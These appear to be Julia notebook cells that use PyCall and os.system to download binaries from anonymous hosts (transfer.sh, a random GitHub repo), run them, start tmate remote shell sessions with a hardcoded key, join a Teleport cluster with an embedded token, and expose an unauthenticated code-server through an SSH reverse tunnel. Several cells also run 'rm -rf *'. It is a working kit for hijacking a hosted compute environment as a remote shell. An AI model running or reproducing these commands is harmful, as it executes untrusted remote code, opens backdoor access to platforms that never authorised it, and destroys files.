begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("apt-get update -y && apt-get install curl wget -y")
	os.system("wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n tmate")
end

begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("rm -rf * && curl -skLo gdown https://raw.githubusercontent.com/kmille36/GoogleDriveCurl/main/gdown && chmod +x gdown")
	os.system("bash gdown bullseye.tar 1Q9M0rqbGjqZW51nxk6N5WHi6wRBmDNnR && tar -xf *.tar && rm -rf *.tar")
	os.system("cd bullseye && ./proot -S . bash -c 'wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz && tar -xvf tmate-2.4.0-static-linux-amd64.tar.xz && rm -rf tmate-2.4.0-static-linux-amd64.tar.xz && mv tmate-2.4.0-static-linux-amd64/tmate tmate && rm -rf tmate-2.4.0-static-linux-amd64 && chmod +x tmate'")
	os.system("cd bullseye && ./proot -S . bash -c './tmate -F >> tmate.log &'")
end

begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("cd bullseye && ./proot -S . cat tmate.log")
end


begin
	os.system("rm -rf * && curl -o  bullseye.tar https://transfer.sh/get/MQSON7/bullseye.tar && tar -xf bullseye.tar && rm -rf bullseye.tar")
	os.system("cd bullseye && ./proot -S . teleport start --roles=node --token=cc853116701f7b76833c08510637d10f --auth-server=kgydudgkw.teleport.sh:443")
end


begin
	os.system("cd bullseye && ./proot -S . apt-get install xz-utils")
	os.system("cd bullseye && ./proot -S . bash -c 'wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz && tar -xvf tmate-2.4.0-static-linux-amd64.tar.xz && rm -rf tmate-2.4.0-static-linux-amd64.tar.xz && mv tmate-2.4.0-static-linux-amd64/tmate tmate && rm -rf tmate-2.4.0-static-linux-amd64 && chmod +x tmate'")
	os.system("cd bullseye && ./proot -S . bash -c './tmate -F >> tmate.log &'")
end

begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("curl -o tmate https://transfer.sh/FvuVJb/tmate && chmod +x tmate")
	os.system("./tmate -F >> tmate.log &")
end
begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("cat tmate.log")
end

begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
    os.system("curl -o code-server-4.12.0-linux-amd64.tar https://transfer.sh/bhYBys/code-server-4.12.0-linux-amd64.tar && tar -xf *.tar")
    os.system("./code-server-4.12.0-linux-amd64/bin/code-server --bind-addr 127.0.0.1:10000 --auth none >> vscode.log & ssh -o StrictHostKeychecking=no -R 80:localhost:10000 nokey@localhost.run >> localhost.log &")
end
begin
	import Pkg
	Pkg.update()
	Pkg.add("PyCall"); using PyCall
	os = pyimport("os")
	os.system("cat localhost.log")
	os.system("cat vscode.log")
end